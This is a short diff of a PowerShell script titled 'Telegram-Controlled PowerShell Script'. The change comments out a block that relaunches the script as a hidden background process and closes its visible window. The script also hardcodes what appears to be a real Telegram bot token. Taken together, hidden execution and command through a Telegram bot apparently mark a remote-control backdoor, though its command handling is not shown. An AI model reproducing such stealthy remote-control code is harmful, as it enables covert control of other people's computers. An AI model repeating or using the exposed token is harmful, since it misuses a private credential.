@@ -1,4 +1,4 @@
-# Relaunch in background and auto-close visible window
+<#
 if (-not $env:PS_RUN_HIDDEN) {
     $env:PS_RUN_HIDDEN = "1"
     $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -9,6 +9,7 @@ if (-not $env:PS_RUN_HIDDEN) {
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     exit
 }
+#>
 
 # Telegram-Controlled PowerShell Script
 $botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
